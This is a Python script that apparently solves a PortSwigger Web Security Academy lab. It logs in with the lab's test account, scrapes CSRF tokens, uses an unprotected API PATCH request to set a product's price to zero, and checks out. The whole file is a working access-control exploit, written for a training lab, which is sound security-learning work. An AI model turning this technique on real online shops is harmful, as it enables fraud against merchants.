# usage:
# python3 2.py \
# --u https://0aaa00a7037819be80f76c960063008a.web-security-academy.net

import http.client
import re
from argparse import ArgumentParser

import requests

http.client.HTTPConnection.debuglevel = 1


class Solution:
    def __init__(self, url: str) -> None:
        self.url = url.rstrip("/")
        self.s = None

    def login(self, username: str, password: str) -> requests.Response:
        self.s = requests.Session()
        login_url = f"{self.url}/login"
        r = self.s.get(login_url)
        csrf = re.findall(r"\"csrf\" value=\"([\w]+)\"", r.text)[0]
        r = self.s.post(
            login_url,
            data={
                "csrf": csrf,
                "username": username,
                "password": password,
            },
        )

        return r

    def solve(self) -> None:
        self.login("wiener", "peter")
        self.s.patch(f"{self.url}/api/products/1/price", json={"price": 0})
        self.s.post(
            f"{self.url}/cart", data={"productId": 1, "redir": "PRODUCT", "quantity": 1}
        )
        r = self.s.get(f"{self.url}/cart")
        csrf = re.findall(r"/cart/checkout.*\s.*csrf\" value=\"([\w]+)\"", r.text)[0]
        r = self.s.post(f"{self.url}/cart/checkout", data={"csrf": csrf})


def main():
    parser = ArgumentParser()
    parser.add_argument("--u", "--url", dest="url")
    args = parser.parse_args()
    s = Solution(args.url)
    s.solve()


if __name__ == "__main__":
    main()
